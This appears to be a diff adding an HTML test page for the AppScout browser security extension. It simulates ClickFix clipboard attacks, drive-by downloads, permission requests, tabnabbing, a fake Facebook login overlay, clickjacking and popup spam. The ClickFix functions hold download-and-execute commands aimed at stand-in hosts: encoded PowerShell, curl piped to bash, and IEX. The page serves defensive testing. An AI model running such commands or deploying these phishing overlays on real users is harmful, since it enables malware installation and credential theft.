@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AppScout Attack Demo - Security Testing Lab</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    header {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+      margin-bottom: 30px;
+      text-align: center;
+    }
+
+    header h1 {
+      color: #667eea;
+      font-size: 36px;
+      margin-bottom: 10px;
+    }
+
+    header p {
+      color: #666;
+      font-size: 16px;
+    }
+
+    .warning-banner {
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 30px;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+
+    .warning-banner strong {
+      font-size: 18px;
+    }
+
+    .attack-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+      gap: 25px;
+      margin-bottom: 30px;
+    }
+
+    .attack-card {
+      background: white;
+      border-radius: 15px;
+      padding: 25px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .attack-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 40px rgba(0,0,0,0.25);
+    }
+
+    .attack-card h2 {
+      color: #333;
+      font-size: 22px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .attack-card .icon {
+      font-size: 28px;
+    }
+
+    .attack-card p {
+      color: #666;
+      margin-bottom: 15px;
+      line-height: 1.6;
+      font-size: 14px;
+    }
+
+    .attack-btn {
+      width: 100%;
+      padding: 12px 20px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+    }
+
+    .attack-btn:hover {
+      transform: scale(1.02);
+      box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+    }
+
+    .attack-btn.danger {
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+    }
+
+    .attack-btn.danger:hover {
+      box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4);
+    }
+
+    .code-box {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 15px;
+      border-radius: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      margin: 10px 0;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+
+    .status {
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 10px;
+      font-size: 13px;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    .status.success {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+
+    .status.error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    .status.warning {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeaa7;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    /* Phishing overlay styles */
+    #phishing-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 9999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #phishing-overlay.active {
+      display: flex;
+    }
+
+    .fake-login {
+      background: white;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+      max-width: 400px;
+      width: 90%;
+      position: relative;
+    }
+
+    .fake-login h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .fake-login input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .fake-login button {
+      width: 100%;
+      padding: 12px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .close-overlay {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: #f44336;
+      color: white;
+      border: none;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
+    footer {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      color: #666;
+      margin-top: 30px;
+    }
+
+    .test-log {
+      background: #1e1e1e;
+      color: #0f0;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 15px;
+      font-family: monospace;
+      font-size: 12px;
+      max-height: 150px;
+      overflow-y: auto;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <header>
+    <h1>🛡️ AppScout Attack Demo Lab</h1>
+    <p>Test your extension against real-world browser attacks</p>
+  </header>
+
+  <div class="warning-banner">
+    <strong>⚠️ WARNING:</strong> This page contains simulated attacks for testing purposes only. 
+    Use in a controlled environment with AppScout extension enabled.
+  </div>
+
+  <div class="attack-grid">
+    
+    <!-- ClickFix Attack -->
+    <div class="attack-card">
+      <h2><span class="icon">📋</span> ClickFix Attack</h2>
+      <p>Tricks users into copying and executing malicious commands. Your extension should detect and warn about dangerous clipboard content.</p>
+      
+      <button class="attack-btn danger" onclick="clickFixAttack1()">
+        💀 Copy Malicious PowerShell
+      </button>
+      <button class="attack-btn danger" onclick="clickFixAttack2()">
+        💀 Copy Curl Pipe to Bash
+      </button>
+      <button class="attack-btn danger" onclick="clickFixAttack3()">
+        💀 Copy Encoded Command
+      </button>
+      
+      <div id="clickfix-status" class="status hidden"></div>
+      
+      <div class="code-box" id="clickfix-code" style="display: none;"></div>
+    </div>
+
+    <!-- Drive-by Download -->
+    <div class="attack-card">
+      <h2><span class="icon">⬇️</span> Drive-by Download</h2>
+      <p>Attempts to automatically download a file without user consent. Your extension should block automatic downloads.</p>
+      
+      <button class="attack-btn danger" onclick="driveByDownload()">
+        💀 Trigger Auto Download
+      </button>
+      <button class="attack-btn danger" onclick="multipleDownloads()">
+        💀 Multiple Downloads
+      </button>
+      
+      <div id="download-status" class="status hidden"></div>
+      <div class="test-log" id="download-log" style="display: none;"></div>
+    </div>
+
+    <!-- Camera/Microphone Access -->
+    <div class="attack-card">
+      <h2><span class="icon">🎤</span> Mic/Camera Access</h2>
+      <p>Requests access to your microphone and camera. Your extension should warn about or block these sensitive permissions.</p>
+      
+      <button class="attack-btn danger" onclick="requestMicrophone()">
+        💀 Request Microphone
+      </button>
+      <button class="attack-btn danger" onclick="requestCamera()">
+        💀 Request Camera
+      </button>
+      <button class="attack-btn danger" onclick="requestBoth()">
+        💀 Request Both
+      </button>
+      
+      <div id="media-status" class="status hidden"></div>
+    </div>
+
+    <!-- Location Access -->
+    <div class="attack-card">
+      <h2><span class="icon">📍</span> Location Tracking</h2>
+      <p>Attempts to access your geolocation. Your extension should detect and warn about location permission requests.</p>
+      
+      <button class="attack-btn danger" onclick="requestLocation()">
+        💀 Request Location
+      </button>
+      <button class="attack-btn danger" onclick="trackLocation()">
+        💀 Continuous Tracking
+      </button>
+      
+      <div id="location-status" class="status hidden"></div>
+    </div>
+
+    <!-- Tabnabbing Attack -->
+    <div class="attack-card">
+      <h2><span class="icon">🔗</span> Tabnabbing</h2>
+      <p>Opens a new tab and changes the original page to a phishing site. Your extension should detect suspicious tab behavior.</p>
+      
+      <button class="attack-btn danger" onclick="tabnabbingAttack()">
+        💀 Trigger Tabnabbing
+      </button>
+      
+      <div id="tabnab-status" class="status hidden"></div>
+      <p style="font-size: 12px; color: #999; margin-top: 10px;">
+        ℹ️ This will open a new tab and change this page after 3 seconds
+      </p>
+    </div>
+
+    <!-- Phishing UI Redressing -->
+    <div class="attack-card">
+      <h2><span class="icon">🎭</span> UI Redressing</h2>
+      <p>Displays a fake login overlay to steal credentials. Your extension should warn about suspicious overlays.</p>
+      
+      <button class="attack-btn danger" onclick="showPhishingOverlay()">
+        💀 Show Fake Login
+      </button>
+      <button class="attack-btn danger" onclick="clickjackingAttack()">
+        💀 Clickjacking Overlay
+      </button>
+      
+      <div id="phishing-status" class="status hidden"></div>
+    </div>
+
+    <!-- Background Sync Attack -->
+    <div class="attack-card">
+      <h2><span class="icon">🔄</span> Background Sync</h2>
+      <p>Attempts to register background sync that can send data even after you close the tab.</p>
+      
+      <button class="attack-btn danger" onclick="backgroundSyncAttack()">
+        💀 Register Background Sync
+      </button>
+      
+      <div id="sync-status" class="status hidden"></div>
+    </div>
+
+    <!-- Popup Spam -->
+    <div class="attack-card">
+      <h2><span class="icon">💥</span> Popup Spam</h2>
+      <p>Attempts to open multiple popup windows to annoy or deceive users.</p>
+      
+      <button class="attack-btn danger" onclick="popupSpam()">
+        💀 Spawn Popups
+      </button>
+      <button class="attack-btn danger" onclick="alertSpam()">
+        💀 Alert Spam
+      </button>
+      
+      <div id="popup-status" class="status hidden"></div>
+    </div>
+
+  </div>
+
+  <footer>
+    <p>🛡️ <strong>AppScout Security Testing Lab</strong> | Educational purposes only</p>
+    <p style="margin-top: 10px; font-size: 13px;">
+      If AppScout extension is working correctly, it should detect and warn about these attacks.
+    </p>
+  </footer>
+</div>
+
+<!-- Phishing Overlay -->
+<div id="phishing-overlay">
+  <div class="fake-login">
+    <button class="close-overlay" onclick="hidePhishingOverlay()">×</button>
+    <h2>🔒 Facebook Login</h2>
+    <p style="color: #666; margin-bottom: 20px; font-size: 14px;">Please log in to continue</p>
+    <input type="email" placeholder="Email or Phone" id="fake-email">
+    <input type="password" placeholder="Password" id="fake-password">
+    <button onclick="captureCredentials()">Log In</button>
+    <p style="margin-top: 15px; font-size: 12px; color: #999; text-align: center;">
+      ⚠️ This is a FAKE login form for testing purposes
+    </p>
+  </div>
+</div>
+
+<script>
+// ================= CLICKFIX ATTACKS =================
+
+function clickFixAttack1() {
+  const maliciousCommand = `powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvAG0AYQBsAHcAYQByAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAiACwAIAAiAEMAOgBcAFQAZQBtAHAAXABtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIgApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVABlAG0AcABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQAiAA==`;
+  
+  copyToClipboard(maliciousCommand);
+  
+  document.getElementById('clickfix-code').style.display = 'block';
+  document.getElementById('clickfix-code').textContent = maliciousCommand;
+  
+  showStatus('clickfix-status', '💀 Malicious PowerShell command copied to clipboard! AppScout should alert you!', 'error');
+}
+
+function clickFixAttack2() {
+  const maliciousCommand = `curl -s https://evil.com/malware.sh | bash`;
+  
+  copyToClipboard(maliciousCommand);
+  
+  document.getElementById('clickfix-code').style.display = 'block';
+  document.getElementById('clickfix-code').textContent = maliciousCommand;
+  
+  showStatus('clickfix-status', '💀 Curl pipe to bash copied! AppScout should warn you!', 'error');
+}
+
+function clickFixAttack3() {
+  const maliciousCommand = `IEX (New-Object Net.WebClient).DownloadString('http://malware.com/payload.ps1')`;
+  
+  copyToClipboard(maliciousCommand);
+  
+  document.getElementById('clickfix-code').style.display = 'block';
+  document.getElementById('clickfix-code').textContent = maliciousCommand;
+  
+  showStatus('clickfix-status', '💀 PowerShell IEX download copied! AppScout should alert!', 'error');
+}
+
+function copyToClipboard(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    console.log('Malicious command copied to clipboard');
+  }).catch(err => {
+    console.error('Failed to copy:', err);
+  });
+}
+
+// ================= DRIVE-BY DOWNLOAD =================
+
+function driveByDownload() {
+  const blob = new Blob(['This is a test file for drive-by download simulation'], { type: 'application/octet-stream' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'malicious_file.exe';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  
+  logDownload('Attempted automatic download of malicious_file.exe');
+  showStatus('download-status', '💀 Auto-download triggered! AppScout should block it!', 'error');
+  document.getElementById('download-log').style.display = 'block';
+}
+
+function multipleDownloads() {
+  for (let i = 1; i <= 5; i++) {
+    setTimeout(() => {
+      const blob = new Blob([`Malicious file ${i}`], { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `malware_${i}.dll`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      
+      logDownload(`Downloaded malware_${i}.dll`);
+    }, i * 500);
+  }
+  
+  showStatus('download-status', '💀 Multiple downloads triggered! AppScout should block!', 'error');
+  document.getElementById('download-log').style.display = 'block';
+}
+
+function logDownload(message) {
+  const log = document.getElementById('download-log');
+  log.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}\n`;
+  log.scrollTop = log.scrollHeight;
+}
+
+// ================= MICROPHONE/CAMERA ACCESS =================
+
+function requestMicrophone() {
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(stream => {
+      showStatus('media-status', '⚠️ Microphone access GRANTED! AppScout should have warned!', 'error');
+      stream.getTracks().forEach(track => track.stop());
+    })
+    .catch(err => {
+      showStatus('media-status', '✅ Microphone access DENIED or blocked by AppScout!', 'success');
+    });
+}
+
+function requestCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      showStatus('media-status', '⚠️ Camera access GRANTED! AppScout should have warned!', 'error');
+      stream.getTracks().forEach(track => track.stop());
+    })
+    .catch(err => {
+      showStatus('media-status', '✅ Camera access DENIED or blocked by AppScout!', 'success');
+    });
+}
+
+function requestBoth() {
+  navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+    .then(stream => {
+      showStatus('media-status', '⚠️ Camera & Mic access GRANTED! AppScout should have warned!', 'error');
+      stream.getTracks().forEach(track => track.stop());
+    })
+    .catch(err => {
+      showStatus('media-status', '✅ Camera & Mic access DENIED or blocked by AppScout!', 'success');
+    });
+}
+
+// ================= LOCATION TRACKING =================
+
+function requestLocation() {
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      showStatus('location-status', `⚠️ Location access GRANTED! Lat: ${position.coords.latitude.toFixed(2)}`, 'error');
+    },
+    error => {
+      showStatus('location-status', '✅ Location access DENIED or blocked by AppScout!', 'success');
+    }
+  );
+}
+
+function trackLocation() {
+  const watchId = navigator.geolocation.watchPosition(
+    position => {
+      showStatus('location-status', '⚠️ Continuous location tracking ACTIVE! AppScout should warn!', 'error');
+    },
+    error => {
+      showStatus('location-status', '✅ Continuous tracking BLOCKED by AppScout!', 'success');
+    }
+  );
+  
+  setTimeout(() => {
+    navigator.geolocation.clearWatch(watchId);
+  }, 5000);
+}
+
+// ================= TABNABBING =================
+
+function tabnabbingAttack() {
+  // Open a new window
+  const newWindow = window.open('https://www.google.com', '_blank');
+  
+  showStatus('tabnab-status', '⏱️ New tab opened. This page will change in 3 seconds...', 'warning');
+  
+  // After 3 seconds, change the current page to a phishing site
+  setTimeout(() => {
+    // In a real attack, this would redirect to a phishing page
+    document.body.innerHTML = `
+      <div style="text-align: center; padding: 100px; background: #1877f2; color: white; height: 100vh;">
+        <h1>🎣 FAKE FACEBOOK LOGIN</h1>
+        <p style="font-size: 20px; margin: 20px 0;">This is a simulated tabnabbing attack!</p>
+        <p>In a real attack, this page would look exactly like Facebook.</p>
+        <p style="margin-top: 30px;">AppScout should have detected the tab behavior change!</p>
+        <button onclick="location.reload()" style="margin-top: 30px; padding: 15px 30px; font-size: 16px; cursor: pointer;">
+          Reload Original Page
+        </button>
+      </div>
+    `;
+  }, 3000);
+}
+
+// ================= PHISHING UI REDRESSING =================
+
+function showPhishingOverlay() {
+  document.getElementById('phishing-overlay').classList.add('active');
+  showStatus('phishing-status', '💀 Fake login overlay displayed! AppScout should warn!', 'error');
+}
+
+function hidePhishingOverlay() {
+  document.getElementById('phishing-overlay').classList.remove('active');
+}
+
+function captureCredentials() {
+  const email = document.getElementById('fake-email').value;
+  const password = document.getElementById('fake-password').value;
+  
+  alert(`⚠️ CREDENTIALS CAPTURED!\n\nEmail: ${email}\nPassword: ${password}\n\nThis is why phishing is dangerous!`);
+  hidePhishingOverlay();
+  
+  showStatus('phishing-status', '💀 Credentials would be stolen! AppScout should have warned!', 'error');
+}
+
+function clickjackingAttack() {
+  const overlay = document.createElement('div');
+  overlay.style.cssText = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.01);
+    z-index: 99999;
+    cursor: pointer;
+  `;
+  
+  overlay.innerHTML = `
+    <iframe src="https://www.google.com" style="width: 100%; height: 100%; opacity: 0.3; pointer-events: none;"></iframe>
+  `;
+  
+  overlay.onclick = () => {
+    alert('🎯 Click captured by invisible overlay! This is clickjacking!');
+    document.body.removeChild(overlay);
+  };
+  
+  document.body.appendChild(overlay);
+  showStatus('phishing-status', '💀 Invisible clickjacking layer active!', 'error');
+}
+
+// ================= BACKGROUND SYNC =================
+
+async function backgroundSyncAttack() {
+  if ('serviceWorker' in navigator && 'SyncManager' in window) {
+    try {
+      const registration = await navigator.serviceWorker.ready;
+      await registration.sync.register('malicious-sync');
+      showStatus('sync-status', '⚠️ Background sync registered! AppScout should have blocked!', 'error');
+    } catch (err) {
+      showStatus('sync-status', '✅ Background sync BLOCKED by AppScout!', 'success');
+    }
+  } else {
+    showStatus('sync-status', 'ℹ️ Background sync not supported in this browser', 'warning');
+  }
+}
+
+// ================= POPUP SPAM =================
+
+function popupSpam() {
+  for (let i = 0; i < 10; i++) {
+    setTimeout(() => {
+      window.open('about:blank', '_blank', 'width=300,height=200');
+    }, i * 100);
+  }
+  showStatus('popup-status', '💀 10 popups spawned! AppScout should block!', 'error');
+}
+
+function alertSpam() {
+  let count = 0;
+  const spamInterval = setInterval(() => {
+    alert(`🚨 Alert spam #${++count}! Close this to see the next one!`);
+    if (count >= 5) {
+      clearInterval(spamInterval);
+      showStatus('popup-status', '💀 Alert spam complete! Very annoying!', 'error');
+    }
+  }, 500);
+}
+
+// ================= UTILITY FUNCTIONS =================
+
+function showStatus(elementId, message, type) {
+  const statusEl = document.getElementById(elementId);
+  statusEl.textContent = message;
+  statusEl.className = `status ${type}`;
+  statusEl.classList.remove('hidden');
+  
+  setTimeout(() => {
+    statusEl.classList.add('hidden');
+  }, 8000);
+}
+</script>
+
+</body>
+</html>
